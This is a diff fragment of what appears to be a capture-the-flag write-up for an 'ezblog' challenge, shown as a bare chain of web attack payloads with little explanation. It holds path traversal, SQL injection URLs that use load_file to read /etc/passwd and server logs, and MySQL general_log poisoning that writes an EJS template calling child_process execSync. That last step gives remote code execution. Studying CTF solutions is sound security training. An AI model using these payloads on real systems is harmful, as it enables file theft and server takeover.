@@ -14,29 +14,9 @@ Ssti
 
 ```
 /admin/../flag
-```
-
-
-
-```
 { "alice@example.com","bob@zhangkeji.com", Ucharlie@sanfeng.com""jom@roomke.com"}
-```
-
-
-
-```
 http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11 union select load_file('/etc/passwd'),load_file('/etc/passwd'),load_file('/etc/passwd')/edit
-```
-
-
-
-```
 http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11%20union%20select%20load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log')/edit
-```
-
-
-
-```
 CREATE TABLE mysql.general_log (
   event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
   user_host mediumtext NOT NULL,
@@ -45,17 +25,7 @@ CREATE TABLE mysql.general_log (
   command_type varchar(64) NOT NULL,
   argument mediumtext NOT NULL
 ) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log'
-```
-
-
-
-```
 SET%20GLOBAL%20general_log_file%20%3D%20'%2Fhome%2Fezblog%2Fviews%2Findex.ejs'%3B
-```
-
-
-
-```
 select%20'%3C%25%3D%20process.mainModule.require(%22child_process%22).execSync(%22%2Freadflag%22).toString()%20%25%3E'%3B
 ```
 
